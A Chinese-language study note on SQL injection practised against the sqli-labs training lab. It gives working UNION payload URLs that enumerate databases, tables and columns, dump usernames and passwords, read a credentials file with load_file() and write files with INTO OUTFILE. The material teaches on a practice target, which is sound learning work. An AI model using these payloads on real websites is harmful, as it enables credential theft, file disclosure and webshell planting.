## sql注入之高权限注入

![image-20250805150645634](../AppData/Roaming/Typora/typora-user-images/image-20250805150645634.png)

![image-20250805151055597](../AppData/Roaming/Typora/typora-user-images/image-20250805151055597.png)

mysql中存在4个控制权限的表，分别为user表，db表，table_priv表，column_priv表

#### 查询所有数据库名称

![image-20250805163028710](../AppData/Roaming/Typora/typora-user-images/image-20250805163028710.png)

http://sqli-labs/Less-2/index.php?id=99%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata

#### 查询数据库对应的表名

![image-20250805190406274](../AppData/Roaming/Typora/typora-user-images/image-20250805190406274.png)

http://sqli-labs/Less-2/index.php?id=99%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27%20

- `table_schema='security'`（用单引号包裹字符串）

#### 查询表名对应的字段名

![image-20250805185942057](../AppData/Roaming/Typora/typora-user-images/image-20250805185942057.png)

http://sqli-labs/Less-2/index.php?id=99%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%20

- `table_schema='security'`（用单引号包裹字符串）

#### 查询数据

![image-20250805210512694](../AppData/Roaming/Typora/typora-user-images/image-20250805210512694.png)

 http://sqli-labs/Less-2/index.php?id=99%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20

### SQL注入之文件读写

 

```
 cd D:\phpstudy_pro\Extensions\MySQL5.7.26\bin
  mysql -u root -p -h 127.0.0.1
```

高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限

**secure_file_priv选项**

```
linux
cat  etc/conf

win
www/mysql / my.ini

```

show global variables like '%secure%'  查看mysql全局变量的配置

![image-20250807181648375](../AppData/Roaming/Typora/typora-user-images/image-20250807181648375.png)

#### 读取文件

使用函数：`load_file()`

后面的路径可以是单引号，0x，char转换的字符。

==注意：路径中斜杠是/不是\。==

一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置...

![image-20250807183353309](../AppData/Roaming/Typora/typora-user-images/image-20250807183353309.png)

view-source:http://sqli-labs/Less-2/index.php?id=99%20union%20select%201,%20load_file(%27D:\\phpstudy_pro\\WWW\\sqli-labs\\sql-connections\\db-creds.inc%27),%203 

使用函数：`Into Outfile`（能写入多行，按格式输出）和 `into Dumpfile`（只能写入一行且没有输出格式）

outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径

2、知道网站绝对路径

Windows常见：

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/52b8185c15804b098e5832e56952f9d5.png)

Linux常见：

![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/c22c368cda784e5ebb911ff0bbd0fa99.png)

路径获取常见方式：

报错显示，遗留文件，漏洞报错，平台配置文件等

#### 写入文件

使用函数：`Into Outfile`（能写入多行，按格式输出）和 `into Dumpfile`（只能写入一行且没有输出格式）

outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径

http://sqli-labs/Less-2/index.php?id=99%20union%20select%201,%27mc%27,3%20Into%20Outfile%20%27d:/d.txt%27--+
